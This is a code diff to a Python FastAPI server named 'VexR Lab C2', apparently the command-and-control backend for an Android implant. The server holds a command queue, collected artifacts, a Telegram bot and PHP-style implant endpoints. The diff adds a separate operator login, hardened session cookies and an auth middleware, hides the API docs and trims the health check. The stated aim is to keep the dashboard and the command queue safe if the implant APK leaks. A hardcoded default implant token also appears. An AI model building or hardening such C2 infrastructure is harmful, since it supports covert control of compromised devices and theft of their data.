@@ -24,13 +24,23 @@ Run:  uvicorn server:app --host 0.0.0.0 --port 8000
 from __future__ import annotations
 
 import asyncio
+import hmac
+import html
 import json
 import logging
 import os
+import secrets
 from typing import Any, Optional
+from urllib.parse import parse_qs
 
 from fastapi import FastAPI, HTTPException, Query, Request
-from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, Response
+from fastapi.responses import (
+    FileResponse,
+    HTMLResponse,
+    JSONResponse,
+    RedirectResponse,
+    Response,
+)
 from pydantic import BaseModel
 
 import store
@@ -49,12 +59,38 @@ from protocol import (
 AUTH_TOKEN = os.environ.get("VEXR_AUTH_TOKEN", "VexR_Lab_Academic_Token_2026")
 SUDO_PORT = "EeILBT"  # from assets/sudoport.txt
 
-app = FastAPI(title="VexR Lab C2", docs_url=None, redoc_url=None)
+app = FastAPI(
+    title="VexR Lab C2", docs_url=None, redoc_url=None, openapi_url=None
+)
+
+COOKIE_NAME = "vexr_session"
+OPERATOR_TOKEN = ""
+
+
+def _resolve_operator_token() -> str:
+    """Prefer the deployment secret; otherwise mint one and keep it in the DB."""
+    token = os.environ.get("VEXR_OPERATOR_TOKEN", "").strip()
+    if token:
+        return token
+    token = store.get_setting("operator_token")
+    if token:
+        return token
+    token = secrets.token_urlsafe(32)
+    store.set_setting("operator_token", token)
+    store.log(
+        "warning",
+        "operator token generated (set VEXR_OPERATOR_TOKEN to choose your own): "
+        f"{token}",
+    )
+    return token
 
 
 @app.on_event("startup")
 def _startup() -> None:
+    global OPERATOR_TOKEN
+
     store.init_db()
+    OPERATOR_TOKEN = _resolve_operator_token()
     store.log(
         "info",
         f"C2 started · db={store.DB_PATH} artifacts={store.ARTIFACT_DIR} "
@@ -119,7 +155,10 @@ async def _start_telegram_bot() -> None:
     # bot reads exactly the database this process serves.
     port = os.environ.get("PORT", "8000")
     _bot_task = asyncio.create_task(
-        telegram_bot.serve(base_url=f"http://127.0.0.1:{port}"),
+        telegram_bot.serve(
+            base_url=f"http://127.0.0.1:{port}",
+            token=OPERATOR_TOKEN,
+        ),
         name="telegram-bot",
     )
     _bot_task.add_done_callback(_on_bot_done)
@@ -147,7 +186,139 @@ async def _stop_telegram_bot() -> None:
 
 
 # ---------------------------------------------------------------------------
-# Auth
+# Operator auth
+# ---------------------------------------------------------------------------
+# AUTH_TOKEN below is the implant token: it is embedded in the APK and must
+# keep working for /panel.php and /file.php. Everything an operator can read or
+# change uses this separate secret instead, so leaking the APK does not expose
+# the dashboard, the artifacts, or the command queue.
+
+_LOGIN_HTML = r"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VexR Lab C2 — Sign in</title>
+<style>
+*,*::before,*::after{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0a0d12;
+  color:#e4e9f0;font-family:system-ui,-apple-system,'Segoe UI',sans-serif}
+.card{width:min(92vw,390px);background:#12171f;border:1px solid #232c38;
+  border-radius:12px;padding:28px}
+h1{margin:0 0 6px;font-size:17px;font-weight:650;letter-spacing:-.01em}
+h1 b{color:#3de8b0}
+p{margin:0 0 20px;color:#9aa5b4;font-size:13px;line-height:1.55}
+label{display:block;font-size:12px;color:#9aa5b4;margin-bottom:6px}
+input{width:100%;padding:11px 12px;border-radius:8px;border:1px solid #2e3947;
+  background:#1a212b;color:#e4e9f0;font:inherit;font-size:14px;outline:none}
+input:focus{border-color:#3de8b0}
+button{width:100%;margin-top:14px;padding:11px;border-radius:8px;border:0;
+  background:#3de8b0;color:#06120e;font:inherit;font-weight:650;cursor:pointer}
+button:hover{filter:brightness(1.05)}
+.err{margin:0 0 14px;color:#f0564b;font-size:13px}
+.hint{margin:16px 0 0;color:#5f6b7c;font-size:11.5px;line-height:1.5}
+</style>
+</head>
+<body>
+<form class="card" method="post" action="/api/login">
+  <h1><b>VexR</b> Lab C2</h1>
+  <p>This console is private. Enter the operator token to continue.</p>
+  __ERROR__
+  <label for="token">Operator token</label>
+  <input id="token" name="token" type="password" autocomplete="current-password"
+         autofocus required>
+  <button type="submit">Sign in</button>
+  <p class="hint">The token is printed once in the server log at first boot,
+     or set VEXR_OPERATOR_TOKEN in the deployment.</p>
+</form>
+</body>
+</html>
+"""
+
+
+def _login_page(error: str = "") -> str:
+    note = f'<p class="err">{html.escape(error)}</p>' if error else ""
+    return _LOGIN_HTML.replace("__ERROR__", note)
+
+
+def _same(left: str, right: str) -> bool:
+    return hmac.compare_digest(left.encode("utf-8"), right.encode("utf-8"))
+
+
+def _operator_ok(request: Request) -> bool:
+    if not OPERATOR_TOKEN:
+        return False
+    header = request.headers.get("X-Auth-Token", "")
+    if header and _same(header, OPERATOR_TOKEN):
+        return True
+    cookie = request.cookies.get(COOKIE_NAME, "")
+    return bool(cookie) and _same(cookie, OPERATOR_TOKEN)
+
+
+@app.middleware("http")
+async def _guard_operator(request: Request, call_next):
+    path = request.url.path
+    if path.startswith("/api/") and path not in (
+        "/api/login",
+        "/api/logout",
+        "/api/publickey",
+    ):
+        if not _operator_ok(request):
+            return JSONResponse({"detail": "unauthorized"}, status_code=401)
+    elif path == "/" and not _operator_ok(request):
+        return HTMLResponse(_login_page())
+    return await call_next(request)
+
+
+@app.post("/api/login")
+async def api_login(request: Request):
+    is_json = request.headers.get("content-type", "").startswith("application/json")
+    if is_json:
+        try:
+            body = await request.json()
+        except Exception:  # noqa: BLE001 - malformed JSON is just a bad token
+            body = {}
+        token = str(body.get("token", ""))
+    else:
+        raw = await request.body()
+        token = parse_qs(raw.decode("utf-8", "replace")).get("token", [""])[0]
+
+    client = request.client.host if request.client else "?"
+
+    if not token or not _same(token, OPERATOR_TOKEN):
+        store.log("warning", f"operator login failed from {client}")
+        await asyncio.sleep(0.4)
+        if is_json:
+            return JSONResponse({"detail": "wrong token"}, status_code=401)
+        return HTMLResponse(_login_page("Wrong token."), status_code=401)
+
+    store.log("info", f"operator login from {client}")
+    response: Response
+    if is_json:
+        response = JSONResponse({"ok": True})
+    else:
+        response = RedirectResponse("/", status_code=303)
+    response.set_cookie(
+        COOKIE_NAME,
+        OPERATOR_TOKEN,
+        max_age=60 * 60 * 24 * 30,
+        httponly=True,
+        secure=True,
+        samesite="strict",
+        path="/",
+    )
+    return response
+
+
+@app.post("/api/logout")
+def api_logout():
+    response = JSONResponse({"ok": True})
+    response.delete_cookie(COOKIE_NAME, path="/")
+    return response
+
+
+# ---------------------------------------------------------------------------
+# Implant auth
 # ---------------------------------------------------------------------------
 
 def _authorized(request: Request) -> bool:
@@ -463,4 +634,5 @@ def dashboard():
 
 @app.get("/health")
 def health():
-    return {"status": "ok", "stats": store.stats()}
+    # Public for Railway's healthcheck. Deliberately says nothing else.
+    return {"status": "ok"}
